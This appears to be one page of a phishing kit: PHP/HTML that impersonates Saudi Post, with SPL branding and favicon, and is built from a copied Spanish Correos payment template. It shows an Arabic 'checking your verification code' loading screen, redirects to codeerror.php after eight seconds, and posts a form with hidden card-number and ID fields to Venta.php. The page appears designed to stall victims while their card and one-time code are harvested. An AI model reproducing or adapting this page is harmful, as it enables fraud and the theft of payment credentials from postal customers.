<?php
header("Refresh: 8; url=codeerror.php", true, 303);
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive gr__sc-icpdz_correos_es">
<head id="Head1">
    <style>
        .hidden {
            display: none;
        }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <script language="javascript" type="text/javascript"
            src="Seleccione%20medio%20de%20pago_fichiers/typeKit.js"></script>

    <style type="text/css">.tk-pt-sans {
            font-family: "pt-sans", sans-serif;
        }</style>
    <style type="text/css">@font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 700;
            font-style: normal;
        }</style>
    <script>try {
            Typekit.load({async: true});
        } catch (e) {
        }</script>

    <link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/main.css">
    <title>
        Saudi Post | SPL
    </title>
    <link id="Link1" rel="shortcut icon"
          href="https://eservices.splonline.com.sa/favicon.ico?v=1">
    <link id="Link2" rel="icon" href="https://eservices.splonline.com.sa/favicon.ico?v=1"
          type="image/ico">
    <script language="javascript" type="text/javascript"
            src="Seleccione%20medio%20de%20pago_fichiers/jquery-1.js"></script>
    <script language="javascript" type="text/javascript"
            src="Seleccione%20medio%20de%20pago_fichiers/jquery-1_002.js"></script>
    <script language="javascript" type="text/javascript"
            src="Seleccione%20medio%20de%20pago_fichiers/jquery-ui-1.js"></script>
    <script type="text/javascript">

        $(document).ready(function () {
            initializeComponents();

            var prm = Sys.WebForms.PageRequestManager.getInstance();
            prm.add_initializeRequest(InitializeRequest);
            prm.add_endRequest(EndRequest);

            function InitializeRequest(sender, args) {
            }

            function EndRequest(sender, args) {
                initializeComponents();
            }

            $(".ogilvy-mediodepago").first().addClass("ogilvy-mediodepago-selecionado");
        });


        function initializeComponents() {
            $("#rdbSelectPayment:checked").parent().parent().addClass("selectedRow");

            var mmpp = $("#rdbSelectPayment:checked").val();
            var sgtc = $("[id*=hdSGTC]").val();
            var contract = $("[id*=hdContract]").val();
            var recurrente = $("[id*=hdRecurrente]").val();

            if (mmpp == sgtc) {
                $("[id*=panelSGTC]").removeClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == contract) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").removeClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == recurrente) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").removeClass("hidden");
            } else {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            }
        }

        function validarNro(e) {
            var key;
            if (window.event) // IE
            {
                key = e.keyCode;
            } else if (e.which) // Netscape/Firefox/Opera
            {
                key = e.which;
            }

            if (key < 48 || key > 57) {
                if (key == 8 || key == 44) // backspace (retroceso) 8 , ',' 44 , '.' 46
                {
                    return true;
                } else {
                    return false;
                }
            }
            return true;
        }

        function confirmarCancelar() {
            if (confirm(document.getElementById('msgCancelar').value)) {
                return true;
            } else {
                return false;
            }
        }

        // function hideLoading() {
        //     document.getElementById('showLoading').style.display = 'none';
        //     $("[id*=pContrato]").addClass("hidden");
        // }

        function changeMMPP(mmpp, control) {
            $(".ogilvy-mediodepago-selecionado").removeClass("ogilvy-mediodepago-selecionado");
            $(control).parent().parent().addClass("ogilvy-mediodepago-selecionado");

            $("[id*=hdMMPP]").val(mmpp);

            var sgtc = $("[id*=hdSGTC]").val();
            var contract = $("[id*=hdContract]").val();
            var recurrente = $("[id*=hdRecurrente]").val();

            if (mmpp == sgtc) {
                $("[id*=panelSGTC]").removeClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == contract) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").removeClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            } else if (mmpp == recurrente) {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").removeClass("hidden");
            } else {
                $("[id*=panelSGTC]").addClass("hidden");
                $("[id*=pContrato]").addClass("hidden");
                $("[id*=panelRecurrente]").addClass("hidden");
            }

        }

        function setValues() {
            $("[id*=hdDNI]").val($("[id*=tbxDni]").val());
            $("[id*=hdCard]").val($("[id*=tbxTarjeta]").val());
            $("[id*=hdContractValue]").val($("[id*=dropDownContratos] option:selected").val());
            $("[id*=hdDetallableValue]").val($("[id*=dropDownDetallables] option:selected").val());
        }

    </script>
</head>

<body onload="hideLoading();" class="ogilvy-body" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
<form name="formInterfaz" method="post" action="Venta.php" id="formInterfaz">
    <div>
        <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
        <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
               value="noL/ublKbWvxjFfj4zMk0foVyI2Pe2GaPCsWwa8PUOP3JtWRl0UIWVuSbxgcy+/ixlTVyCrWXSuPbKbz4B5FrEM28vApEPmIwsqTuzUxxrEp/XmTlqufCphAhuUflRwo4DQj3zaepKP3wab+7tyibp39UVTR3O8gETMyy/oX6+rAO/8J+yvokRiZTU9D3/J8K+N2BRPZmmm5ZoQ8jfTr3R4oivVpmcHdGL51EK57xXgpXMJcF1HO/+tssLyLmvUf0WyxXS9TxZ0AY5c1STR4yJPbFiG1LrDr1OIa3Hvcs6L1CnOE0qxBOIb4sMFXXHlCt2e4LfZkbe4pnXIJE42KspdS44H4ZLKBFu7H1fOAzzesI+YsyBbK2cnhY3t/ro/H8YiIriwJswsFyyuYFMA7ud0DD9ltKwPWRFaFBZ254F+ZUiBOEbP4Y0Yiw9phP15KxJEFmPOZ2m1Ziwu6qYf9ma8CFMcUNtFid6dVacHPlkX6NTHSe0dwkTQJY6tFUldj/FdytVw54LNO0Ux68pfd2MsnB+41QlXFPepVRiM4rfBDVsOv69tR6i/vJpL9rs9dVQpuLuLXAfSHnD4ABKrTlle9ec0Kx+CKAG9DiAmPjXuTinBtBXz4QTGAV6MWQKXDHRkVFRPZs3EyOmfevf7dr70EN2hg6hbEAXLnCE0EbZD/1Ge73az1MnnAMuIEWkkKpIytdnVPSrinDHmPmqBriq8Kou17Fexp23fecrXReLW8IW8k09V9DjvpodEKeq+FU43q+6N4CH8ikbjpPXPouE28pupo5tUflGCPY01c0Psc9kA3Q29tlIA5203TOJE+L/G0HC2G1WB7tx1ixouuwF1K04W/7ewgGiduGsSRsbYYJ36aJfO6+yeyZ6ihCrwvjrTfxcIRzYUi0WNbu23Y7OSNXfmqbOHdSTjS0QjS5/umicEUxN4KGFsc6RLuHjsaGEcwO331Y//PJuBfQLnC1PN9lT+fhIX+tDe0OeIv+xC74OgGu1W4QwACHqjBF0gURkuRqA9IdTgRVBSX3EZWCtoDZ72mqGP5MINy0t6ny0REC33jqgozChKL4B3E1lOBsuW2VFk73DBWNCJTi9m0kMVwjG8JBsNmkJkjqwYT7fpc7rJ6DZNdr9NGQFLntdUWutOanHxus3IsX9lohLeffrjaiRBwwz3GzpBnQCb4/HEFdSYNYEHhCVit6BLvsrajSPqGVZCNp7wgCEofgPFEpFem1tFM98uczJkQTyPvltxbVnA1kS36NdATugyq5vnyroGzEFOqQraTSzqH+UHu+QtmBgOjz0sCM5BC1nAXNhTxi9lDvERrr+NuhCnDeJtMTtYxjATgpxiRoQk/NreJ5JE1eVQtw9/iahMbp/g0JLg2LqnKcxBAuuFLjOZZQ8E5jxyRFSQpxoqJ2nXa/De9NJ9B36sx6SqmWFOjjwP9iTfYob1sVZaidgRFDFzerQNbnT0oTTXTFi2Ul7QjiLyuOnPmQ7tdj0jgSc+OOLSS/OKXQjOXSzuzWICccvBw05bfvYWmQIUQEG2pjiVud8DiwLVcTCpMXb6DSqN43fH6zzVyKtHjCdMWstuy/usSR3Yl6dX8tu/Iv1AOwoMYc2ZUer6DazVjzerRca6wgvt1fFi6kUvzPF4oNh9rxahWGNnh81/6Z2UCek/LLmhCQ+bedSwiXfCaI90plQjFUprRY+8gzwPWGGHeqv2ItD+VeGXvLI66SxDSniUcdmE9MmoEVLtoraomAP5OsmTxyAUa6oSm0Q0ib/1AE9Dhy1bVsQTJe1SO7QnHOvSYHH9MvNjWWXOZfnNJwbvIcNCj3WvqSyI=">
    </div>

    <script type="text/javascript">
        //<![CDATA[
        var theForm = document.forms['formInterfaz'];
        if (!theForm) {
            theForm = document.formInterfaz;
        }

        function __doPostBack(eventTarget, eventArgument) {
            if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
                theForm.__EVENTTARGET.value = eventTarget;
                theForm.__EVENTARGUMENT.value = eventArgument;
                theForm.submit();
            }
        }

        //]]>
    </script>


    <script src="Seleccione%20medio%20de%20pago_fichiers/WebResource.js" type="text/javascript"></script>


    <script type="text/javascript">
        //<![CDATA[
        var __cultureInfo = {
            "name": "es-ES",
            "numberFormat": {
                "CurrencyDecimalDigits": 2,
                "CurrencyDecimalSeparator": ",",
                "IsReadOnly": true,
                "CurrencyGroupSizes": [3],
                "NumberGroupSizes": [3],
                "PercentGroupSizes": [3],
                "CurrencyGroupSeparator": ".",
                "CurrencySymbol": "€",
                "NaNSymbol": "NeuN",
                "CurrencyNegativePattern": 8,
                "NumberNegativePattern": 1,
                "PercentPositivePattern": 0,
                "PercentNegativePattern": 0,
                "NegativeInfinitySymbol": "-Infinito",
                "NegativeSign": "-",
                "NumberDecimalDigits": 2,
                "NumberDecimalSeparator": ",",
                "NumberGroupSeparator": ".",
                "CurrencyPositivePattern": 3,
                "PositiveInfinitySymbol": "Infinito",
                "PositiveSign": "+",
                "PercentDecimalDigits": 2,
                "PercentDecimalSeparator": ",",
                "PercentGroupSeparator": ".",
                "PercentSymbol": "%",
                "PerMilleSymbol": "‰",
                "NativeDigits": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
                "DigitSubstitution": 1
            },
            "dateTimeFormat": {
                "AMDesignator": "",
                "Calendar": {
                    "MinSupportedDateTime": "\/Date(-62135596800000)\/",
                    "MaxSupportedDateTime": "\/Date(253402297199999)\/",
                    "AlgorithmType": 1,
                    "CalendarType": 1,
                    "Eras": [1],
                    "TwoDigitYearMax": 2029,
                    "IsReadOnly": true
                },
                "DateSeparator": "/",
                "FirstDayOfWeek": 1,
                "CalendarWeekRule": 0,
                "FullDateTimePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy H:mm:ss",
                "LongDatePattern": "dddd, dd\u0027 de \u0027MMMM\u0027 de \u0027yyyy",
                "LongTimePattern": "H:mm:ss",
                "MonthDayPattern": "dd MMMM",
                "PMDesignator": "",
                "RFC1123Pattern": "ddd, dd MMM yyyy HH\u0027:\u0027mm\u0027:\u0027ss \u0027GMT\u0027",
                "ShortDatePattern": "dd/MM/yyyy",
                "ShortTimePattern": "H:mm",
                "SortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd\u0027T\u0027HH\u0027:\u0027mm\u0027:\u0027ss",
                "TimeSeparator": ":",
                "UniversalSortableDateTimePattern": "yyyy\u0027-\u0027MM\u0027-\u0027dd HH\u0027:\u0027mm\u0027:\u0027ss\u0027Z\u0027",
                "YearMonthPattern": "MMMM\u0027 de \u0027yyyy",
                "AbbreviatedDayNames": ["dom", "lun", "mar", "mié", "jue", "vie", "sáb"],
                "ShortestDayNames": ["do", "lu", "ma", "mi", "ju", "vi", "sá"],
                "DayNames": ["domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado"],
                "AbbreviatedMonthNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                "MonthNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""],
                "IsReadOnly": true,
                "NativeCalendarName": "calendario gregoriano",
                "AbbreviatedMonthGenitiveNames": ["ene", "feb", "mar", "abr", "may", "jun", "jul", "ago", "sep", "oct", "nov", "dic", ""],
                "MonthGenitiveNames": ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre", ""]
            },
            "eras": [1, "d.C.", null, 0]
        };//]]>
    </script>

    <script src="Seleccione%20medio%20de%20pago_fichiers/ScriptResource_002.js" type="text/javascript"></script>
    <script type="text/javascript">
        //<![CDATA[
        if (typeof (Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
        //]]>
    </script>

    <script src="Seleccione%20medio%20de%20pago_fichiers/ScriptResource.js" type="text/javascript"></script>

    <!-- Load -->
    <div id="showLoading" style="display: none;">
        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
            <div class="load-container load">
                <div class="loader">
                    <span id="cargar" >Loading..</span></div>
            </div>
        </div>
    </div>


    <div class="wrapper">

        <section>
            <div id="cabecera" class="container ogilvy-bg-white">
                <div class="row">
                    <div class="col-xs-12 text-center ogilvy-header">
                        <img src="./Redsys_files/POST.svg" id="logoCorreos"
                             class="ogilvy-logosuperior" alt="Aramex">

                    </div>
                </div>
            </div>
        </section>

        <div id="panelContent">

            <div class="contenido" id="contenido">
                <!--ERROR-->

                <!--TITLES-->

                <section>
                    <div class="container">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">

                                <div id="DatosExtra" class="ogilvy-subtitular">

                                    <span id="Importe" class="subtitulo" style="font-weight:bold;"></span>
                                    <span id="Importevalor" class="subtitulo"></span>


                                </div>




                            </div>

                        </div>
                    </div>
                </section>


                <script type="text/javascript">
                    //<![CDATA[
                    Sys.WebForms.PageRequestManager._initialize('smMaster', 'formInterfaz', ['tupdPanel', ''], [], [], 90, '');
                    //]]>
                </script>

                <div id="updPanel">

                    <!--Loading-->
                    <div id="updateProgress" style="display:block;" role="status" aria-hidden="true">

                        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                            <div class="load-container load">
                                <div class="loader"><br><br><br><br>
                                    <span id="loading">.. &#x627;&#x644;&#x645;&#x639;&#x627;&#x644;&#x62c;&#x629;</span>
    <div style="font-size: 11px"><span><b>&#x643;&#x646;&#x20;&#x635;&#x628;&#x648;&#x631;&#x627;&#x64b;&#x20;&#x646;&#x62d;&#x646;&#x20;&#x646;&#x62a;&#x641;&#x642;&#x62f;&#x20;&#x631;&#x645;&#x632;&#x20;&#x627;&#x644;&#x62a;&#x62d;&#x642;&#x642;&#x20;&#x627;&#x644;&#x62e;&#x627;&#x635;&#x20;&#x628;&#x643;</b></span></div>
                                </div>
                                <img  width="150" height="150" src="Venta_fichiers/loading-2.gif">
                            </div>
                        </div>

                    </div>

                    <!--Payments-->


                </div>

                <!--Buttons -->

            </div>

        </div>

    </div>
    <!--Hidden values-->
    <input type="hidden" name="hdMMPP" id="hdMMPP" value="01757TA">
    <input type="hidden" name="hdContract" id="hdContract" value="01757CON">
    <input type="hidden" name="hdSGTC" id="hdSGTC" value="01757SGT">
    <input type="hidden" name="hdDNI" id="hdDNI">
    <input type="hidden" name="hdCard" id="hdCard">
    <input type="hidden" name="hdRecurrente" id="hdRecurrente" value="01757TA">
    <input type="hidden" name="hdContractValue" id="hdContractValue">
    <input type="hidden" name="hdDetallableValue" id="hdDetallableValue">


    <script type="text/javascript">
        //<![CDATA[
        Sys.Application.add_init(function () {
            $create(Sys.UI._UpdateProgress, {
                "associatedUpdatePanelId": null,
                "displayAfter": 500,
                "dynamicLayout": true
            }, null, null, $get("updateProgress"));
        });
        //]]>
    </script>
</form>


</body>
<span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span
            class="gr__triangle"></span></span></html>